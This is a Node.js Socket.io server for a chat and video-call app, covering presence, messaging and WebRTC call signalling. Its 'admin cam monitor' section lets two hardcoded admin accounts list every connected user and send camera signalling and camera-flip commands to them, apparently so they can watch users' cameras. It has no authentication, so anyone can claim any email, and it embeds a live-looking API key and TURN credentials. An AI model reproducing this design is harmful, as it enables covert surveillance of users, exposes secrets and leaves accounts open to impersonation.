require('dotenv').config();
const { createServer } = require('http');
const { Server } = require('socket.io');
const crypto = require('crypto');

const httpServer = createServer((req, res) => {
  // CORS headers for all HTTP requests
  const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',') : ['*'];
  const origin = req.headers.origin;
  if (allowedOrigins.includes('*') || allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.url === '/health' || req.url === '/ping') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok', timestamp: new Date().toISOString() }));
    return;
  }

  // ── TURN Credentials Endpoint ───────────────────────────────────────────
  if (req.url === '/api/turn-credentials' && req.method === 'GET') {
    const meteredDomain = process.env.METERED_DOMAIN || 'myconnectapp.metered.live';
    const meteredApiKey = process.env.METERED_API_KEY || 'e1c37aa2510a0c7e0af21cbd53bdbb0b9fe8';

    const staticMeteredServers = [
      { urls: ['stun:stun.relay.metered.ca:80', 'stun:stun.l.google.com:19302'] },
      {
        urls: [
          'turn:global.relay.metered.ca:80',
          'turn:global.relay.metered.ca:80?transport=tcp',
          'turn:global.relay.metered.ca:443',
          'turns:global.relay.metered.ca:443?transport=tcp',
        ],
        username: 'b861bc5468dd05aa2aff283d',
        credential: 'fJYY96O75HWDNLuH',
      },
    ];

    // Try Metered dynamic REST API first
    if (meteredApiKey && typeof fetch !== 'undefined') {
      fetch(`https://${meteredDomain}/api/v1/turn/credentials?apiKey=${meteredApiKey}`)
        .then(r => r.json())
        .then(servers => {
          if (Array.isArray(servers) && servers.length > 0) {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ iceServers: servers, ttl: 7200 }));
          } else {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ iceServers: staticMeteredServers, ttl: 3600 }));
          }
        })
        .catch(err => {
          console.warn('[Server] Metered API fetch error, using static servers:', err.message);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ iceServers: staticMeteredServers, ttl: 3600 }));
        });
      return;
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ iceServers: staticMeteredServers, ttl: 3600 }));
    return;
  }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Socket.io server is running');
});

const allowedOrigins = process.env.CLIENT_URL 
  ? process.env.CLIENT_URL.split(',') 
  : '*';

const io = new Server(httpServer, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST']
  }
});

// Track online users: identifier -> Set of socket IDs (multiple tabs)
const onlineUsers = new Map(); // email or userId -> Set<socketId>

// Track per-socket heartbeat timestamp for crash detection
const heartbeatMap = new Map(); // socketId -> { userId, email, timestamp }

// Track which socket is in an active call
const activeCalls = new Set();

// Track active callId and peer info per socket for disconnect cleanup
// socketId -> { callId, peerEmail, peerUserId }
const activeCallInfo = new Map();

// *** FIX: Rate limit call_user to prevent spam ***
// socketId -> timestamp of last call initiation
const callRateLimitMap = new Map(); // socketId -> lastCallTimestamp
const CALL_RATE_LIMIT_MS = 3000; // minimum 3s between call attempts

// Helper: get all socket IDs for a target room
function getRoomSockets(target) {
  if (!target) return new Set();
  return io.sockets.adapter.rooms.get(target) || new Set();
}

// Helper: broadcast full online users list to everyone
function broadcastOnlineUsers() {
  const onlineList = Array.from(onlineUsers.keys());
  io.emit('online_users', onlineList);
}

// Broadcast activity update to all connected sockets
// This replaces the old user_last_seen + online_users combo
function broadcastActivityUpdate(userId, email, isOnline, lastSeen) {
  io.emit('activity_update', {
    userId,
    email: email ? email.toLowerCase().trim() : undefined,
    isOnline,
    lastSeen: lastSeen || new Date().toISOString()
  });
}

// ─── 30-SECOND SWEEP: detect stale heartbeats (crash/network loss) ──────────
setInterval(() => {
  const now = Date.now();
  const STALE_THRESHOLD_MS = 60 * 1000; // 60 seconds
  let anyCleaned = false;

  for (const [socketId, data] of heartbeatMap.entries()) {
    const staleness = now - data.timestamp;
    if (staleness > STALE_THRESHOLD_MS) {
      // Socket is stale — mark as offline
      const { userId, email } = data;

      // Clean from onlineUsers
      [email, userId].filter(Boolean).forEach(key => {
        const sockets = onlineUsers.get(key);
        if (sockets) {
          sockets.delete(socketId);
          if (sockets.size === 0) onlineUsers.delete(key);
        }
      });

      heartbeatMap.delete(socketId);
      anyCleaned = true;

      // Broadcast offline with the last known heartbeat time as lastSeen
      const lastSeen = new Date(data.timestamp).toISOString();
      broadcastActivityUpdate(userId, email, false, lastSeen);
      console.log(`[SWEEP] Marked stale socket ${socketId} offline (user: ${email || userId})`);
    }
  }

  if (anyCleaned) {
    broadcastOnlineUsers();
  }
}, 30 * 1000);

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);

  // Send current online users immediately on connection
  socket.emit('online_users', Array.from(onlineUsers.keys()));

  // ─── IDENTIFY ────────────────────────────────────────────────────────────────
  socket.on('identify', ({ email, userId, username }) => {
    let changed = false;

    if (email) {
      const emailRoom = email.toLowerCase().trim();
      socket.join(emailRoom);
      socket.join('cam_room_' + emailRoom);
      socket.userEmail = emailRoom;
      socket.camEmail = emailRoom;
      socket.camUsername = username || emailRoom.split('@')[0];
      if (!onlineUsers.has(emailRoom)) {
        onlineUsers.set(emailRoom, new Set());
        changed = true;
      }
      onlineUsers.get(emailRoom).add(socket.id);
    }

    if (userId) {
      const idRoom = String(userId).trim();
      socket.join(idRoom);
      socket.userId = idRoom;
      if (!onlineUsers.has(idRoom)) {
        onlineUsers.set(idRoom, new Set());
        changed = true;
      }
      onlineUsers.get(idRoom).add(socket.id);
    }

    // Track heartbeat for this socket
    heartbeatMap.set(socket.id, {
      userId: socket.userId,
      email: socket.userEmail,
      timestamp: Date.now()
    });

    // Broadcast online status update to all connected clients
    broadcastActivityUpdate(socket.userId, socket.userEmail, true, new Date().toISOString());
    broadcastOnlineUsers();
    console.log(`User identified: ${socket.userEmail || ''} / ${socket.userId || ''} (${socket.id})`);
  });

  // ─── HEARTBEAT ───────────────────────────────────────────────────────────────
  socket.on('heartbeat', ({ userId, email }) => {
    // Update heartbeat timestamp — lightweight, no DB write needed here
    // The DB is updated by the client's periodic POST to /api/user/activity
    heartbeatMap.set(socket.id, {
      userId: socket.userId || userId,
      email: socket.userEmail || (email ? email.toLowerCase().trim() : undefined),
      timestamp: Date.now()
    });
  });

  // ─── MESSAGING ───────────────────────────────────────────────────────────────
  socket.on('send_social_message', (data) => {
    // Deliver to receiver — prefer email room (always lowercase), fallback to ID room
    const receiverEmailRoom = data.receiverEmail ? data.receiverEmail.toLowerCase().trim() : null;
    const receiverIdRoom = data.receiverId ? String(data.receiverId).trim() : null;

    // Always send to both rooms but track which ones we already sent to avoid true duplicates
    const sentToRooms = new Set();

    if (receiverEmailRoom) {
      socket.to(receiverEmailRoom).emit('receive_social_message', data);
      sentToRooms.add(receiverEmailRoom);
    }
    if (receiverIdRoom && !sentToRooms.has(receiverIdRoom)) {
      // Only send to ID room if email room was NOT already covering it
      // Check if any socket in the ID room is also in the email room (same user)
      const idRoomSockets = io.sockets.adapter.rooms.get(receiverIdRoom) || new Set();
      const emailRoomSockets = receiverEmailRoom ? (io.sockets.adapter.rooms.get(receiverEmailRoom) || new Set()) : new Set();
      // If they overlap, skip — already delivered via email room
      const hasOverlap = [...idRoomSockets].some(sid => emailRoomSockets.has(sid));
      if (!hasOverlap) {
        socket.to(receiverIdRoom).emit('receive_social_message', data);
        sentToRooms.add(receiverIdRoom);
      }
    }

    // Echo to sender's OTHER sockets/tabs so multi-device works
    const senderRoom = socket.userEmail || socket.userId;
    if (senderRoom) {
      socket.to(senderRoom).emit('receive_social_message', data);
    }
  });

  socket.on('delete_social_message', (data) => {
    const { receiverEmail, receiverId, ...deleteData } = data;
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('receive_social_delete', deleteData);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('receive_social_delete', deleteData);
    }
  });

  socket.on('react_social_message', (data) => {
    const { receiverEmail, receiverId, ...reactionData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) {
      socket.to(targetRoom).emit('receive_social_reaction', reactionData);
    }
    if (receiverId && String(receiverId).trim() !== targetRoom) {
      socket.to(String(receiverId).trim()).emit('receive_social_reaction', reactionData);
    }
  });

  socket.on('change_chat_theme', (data) => {
    const { receiverEmail, receiverId, ...themeData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) {
      socket.to(targetRoom).emit('receive_chat_theme', themeData);
    }
    if (receiverId && String(receiverId).trim() !== targetRoom) {
      socket.to(String(receiverId).trim()).emit('receive_chat_theme', themeData);
    }
  });

  socket.on('change_nickname', (data) => {
    const { receiverEmail, receiverId, ...nicknameData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) {
      socket.to(targetRoom).emit('receive_nickname', nicknameData);
    }
    if (receiverId && String(receiverId).trim() !== targetRoom) {
      socket.to(String(receiverId).trim()).emit('receive_nickname', nicknameData);
    }
  });

  // ─── FOLLOW / REQUEST EVENTS ──────────────────────────────────────────────────
  socket.on('social_request_event', (data) => {
    const { targetEmail, targetUserId, ...eventData } = data;
    if (targetEmail) {
      socket.to(targetEmail.toLowerCase().trim()).emit('receive_social_request_event', eventData);
    }
    if (targetUserId) {
      socket.to(String(targetUserId).trim()).emit('receive_social_request_event', eventData);
    }
  });

  // ─── TYPING ──────────────────────────────────────────────────────────────────
  socket.on('typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('user_typing', payload);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('user_typing', payload);
    }
  });

  socket.on('stop_typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('user_stop_typing', payload);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('user_stop_typing', payload);
    }
  });

  // ─── SEEN ────────────────────────────────────────────────────────────────────
  socket.on('mark_as_seen', ({ senderEmail, senderId }) => {
    const seenAt = new Date().toISOString();
    // Notify the original sender their message was seen
    if (senderEmail) {
      socket.to(senderEmail.toLowerCase().trim()).emit('messages_seen', { seenAt });
    }
    if (senderId) {
      const senderIdRoom = String(senderId).trim();
      // Only send to ID room if different from email room to avoid double delivery
      const emailRoom = senderEmail ? senderEmail.toLowerCase().trim() : null;
      const idRoomSockets = io.sockets.adapter.rooms.get(senderIdRoom) || new Set();
      const emailRoomSockets = emailRoom ? (io.sockets.adapter.rooms.get(emailRoom) || new Set()) : new Set();
      const hasOverlap = [...idRoomSockets].some(sid => emailRoomSockets.has(sid));
      if (!hasOverlap) {
        socket.to(senderIdRoom).emit('messages_seen', { seenAt });
      }
    }
  });

  // ─── CALL & WEBRTC SIGNALING EVENTS ──────────────────────────────────────────

  const handleCallRequest = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    // *** FIX: Rate-limit call_user to prevent accidental/spam double calls ***
    const now = Date.now();
    const lastCall = callRateLimitMap.get(socket.id);
    if (lastCall && now - lastCall < CALL_RATE_LIMIT_MS) {
      console.log(`[RateLimit] call_user blocked for socket ${socket.id} (too soon)`);
      return;
    }
    callRateLimitMap.set(socket.id, now);

    // *** Validate: caller must be identified ***
    if (!socket.userEmail && !socket.userId) {
      console.warn('[Security] Unidentified socket attempted call_user');
      return;
    }

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);

    const isTargetBusy = [...targetSockets].some(sid => activeCalls.has(sid));

    if (isTargetBusy) {
      socket.emit('call_busy', { email: targetEmail, userId: targetUserId, callId: data.callId });
      return;
    }

    // Prevent calling yourself
    if (
      (targetEmail && targetEmail === socket.userEmail) ||
      (targetUserId && targetUserId === socket.userId)
    ) {
      return;
    }

    const callId = data.callId || `call-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`;
    const payload = {
      from: { email: socket.userEmail, id: socket.userId, ...data.from },
      type: data.type,
      callId
    };

    if (targetEmail) socket.to(targetEmail).emit('incoming_call', payload);
    if (targetUserId && String(targetUserId).trim() !== targetEmail) {
      socket.to(targetUserId).emit('incoming_call', payload);
    }
  };

  socket.on('call_user', handleCallRequest);
  socket.on('call_request', handleCallRequest);

  const handleCallAccept = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    // Mark the accepting socket as in-call
    activeCalls.add(socket.id);

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);

    // *** FIX: Also mark the calling side sockets as in-call ***
    targetSockets.forEach(sid => activeCalls.add(sid));

    // Track call info for disconnect cleanup — both sides
    activeCallInfo.set(socket.id, {
      callId: data.callId,
      peerEmail: targetEmail,
      peerUserId: targetUserId
    });
    targetSockets.forEach(sid => {
      activeCallInfo.set(sid, {
        callId: data.callId,
        peerEmail: socket.userEmail,
        peerUserId: socket.userId
      });
    });

    const payload = { from: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) {
      socket.to(targetEmail).emit('call_accepted', payload);
    }
    if (targetUserId && String(targetUserId).trim() !== targetEmail) {
      socket.to(String(targetUserId).trim()).emit('call_accepted', payload);
    }
  };

  socket.on('accept_call', handleCallAccept);
  socket.on('call_accept', handleCallAccept);

  const handleCallDecline = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) {
      socket.to(targetEmail).emit('call_rejected', payload);
      socket.to(targetEmail).emit('call_decline', payload);
    }
    if (targetUserId) {
      socket.to(targetUserId).emit('call_rejected', payload);
      socket.to(targetUserId).emit('call_decline', payload);
    }
  };

  socket.on('reject_call', handleCallDecline);
  socket.on('call_decline', handleCallDecline);

  socket.on('call_cancel', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_cancelled', payload);
    if (targetUserId) socket.to(targetUserId).emit('call_cancelled', payload);
  });

  socket.on('call_timeout', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_timed_out', payload);
    if (targetUserId) socket.to(targetUserId).emit('call_timed_out', payload);
  });

  const handleCallEnd = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    callRateLimitMap.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_ended', payload);
    if (targetUserId && String(targetUserId).trim() !== targetEmail) {
      socket.to(String(targetUserId).trim()).emit('call_ended', payload);
    }
  };

  socket.on('end_call', handleCallEnd);
  socket.on('call_end', handleCallEnd);

  // Direct WebRTC SDP offer, answer, and ice_candidate handlers
  socket.on('offer', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { offer: data.offer, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('offer', payload);
    if (targetUserId) socket.to(targetUserId).emit('offer', payload);
  });

  socket.on('answer', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { answer: data.answer, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('answer', payload);
    if (targetUserId) socket.to(targetUserId).emit('answer', payload);
  });

  socket.on('ice_candidate', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { candidate: data.candidate, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('ice_candidate', payload);
    if (targetUserId) socket.to(targetUserId).emit('ice_candidate', payload);
  });

  socket.on('connection_state', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { state: data.state, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('connection_state', payload);
    if (targetUserId) socket.to(targetUserId).emit('connection_state', payload);
  });

  socket.on('webrtc_signal', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const targetSocketId = data.targetSocketId;

    const payload = {
      ...(data.signal || data),
      from: socket.userEmail || socket.userId,
      fromSocketId: socket.id,
      callId: data.callId
    };

    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('webrtc_signal', payload);
        return;
      }
    }

    if (targetEmail) socket.to(targetEmail).emit('webrtc_signal', payload);
    if (targetUserId) socket.to(targetUserId).emit('webrtc_signal', payload);
  });

  // ─── ADMIN CAM MONITOR ─────────────────────────────────────────────────────
  const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];

  socket.on('cam_user_online', ({ email, username }) => {
    socket.camEmail = email ? email.toLowerCase().trim() : null;
    socket.camUsername = username || email;
    if (socket.camEmail) {
      socket.join('cam_room_' + socket.camEmail);
    }
    ADMIN_EMAILS.forEach(adminEmail => {
      socket.to(adminEmail).emit('cam_user_online_event', {
        email: socket.camEmail,
        username: socket.camUsername,
        socketId: socket.id
      });
    });
  });

  socket.on('cam_get_users', () => {
    const userMap = new Map();
    for (const [, s] of io.sockets.sockets) {
      const email = s.camEmail || s.userEmail;
      if (email) {
        const cleanEmail = email.toLowerCase().trim();
        const username = s.camUsername || s.username || cleanEmail.split('@')[0];
        if (!userMap.has(cleanEmail)) {
          userMap.set(cleanEmail, { email: cleanEmail, username, socketId: s.id });
        }
      }
    }
    socket.emit('cam_users_list', Array.from(userMap.values()));
  });

  socket.on('cam_signal', ({ targetSocketId, targetEmail, signal }) => {
    const payload = {
      fromSocketId: socket.id,
      fromEmail: socket.camEmail || socket.userEmail,
      signal
    };

    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('cam_signal', payload);
      }
    }
    if (targetEmail) {
      const cleanEmail = targetEmail.toLowerCase().trim();
      socket.to('cam_room_' + cleanEmail).emit('cam_signal', payload);
      socket.to(cleanEmail).emit('cam_signal', payload);
    }
  });

  socket.on('cam_flip_camera', ({ targetSocketId, targetEmail }) => {
    const payload = { fromSocketId: socket.id };
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('cam_flip_camera', payload);
      }
    }
    if (targetEmail) {
      const cleanEmail = targetEmail.toLowerCase().trim();
      socket.to('cam_room_' + cleanEmail).emit('cam_flip_camera', payload);
      socket.to(cleanEmail).emit('cam_flip_camera', payload);
    }
  });

  // ─── DISCONNECT ──────────────────────────────────────────────────────────────
  socket.on('disconnect', () => {
    console.log('Socket disconnected:', socket.id);

    // ── Notify peer if disconnected during active call ──────────────────
    const callInfo = activeCallInfo.get(socket.id);
    if (callInfo) {
      const payload = { callId: callInfo.callId, by: socket.userEmail || socket.userId };
      if (callInfo.peerEmail) io.to(callInfo.peerEmail).emit('call_ended', payload);
      if (callInfo.peerUserId) io.to(callInfo.peerUserId).emit('call_ended', payload);
      activeCallInfo.delete(socket.id);
    }

    activeCalls.delete(socket.id);
    callRateLimitMap.delete(socket.id);
    heartbeatMap.delete(socket.id);

    // Notify admins that this cam user went offline
    if (socket.camEmail || socket.userEmail) {
      ADMIN_EMAILS.forEach(adminEmail => {
        io.to(adminEmail).emit('cam_user_offline', { socketId: socket.id });
        io.to('cam_room_' + adminEmail).emit('cam_user_offline', { socketId: socket.id });
      });
    }

    // Remove from online tracking
    const roomsToClean = [socket.userEmail, socket.userId].filter(Boolean);
    let wentOffline = false;

    roomsToClean.forEach(room => {
      const sockets = onlineUsers.get(room);
      if (sockets) {
        sockets.delete(socket.id);
        if (sockets.size === 0) {
          onlineUsers.delete(room);
          wentOffline = true;
        }
      }
    });

    if (wentOffline) {
      // Broadcast immediate offline with current time as lastSeen
      broadcastActivityUpdate(
        socket.userId,
        socket.userEmail,
        false,
        new Date().toISOString()
      );
      broadcastOnlineUsers();
    }
  });
});

const PORT = process.env.PORT || 8080;
httpServer.listen(PORT, '0.0.0.0', () => {
  console.log(`>>> Server is running on port ${PORT}`);
  console.log(`>>> Allowed Origins: ${process.env.CLIENT_URL || '*'}`);
});
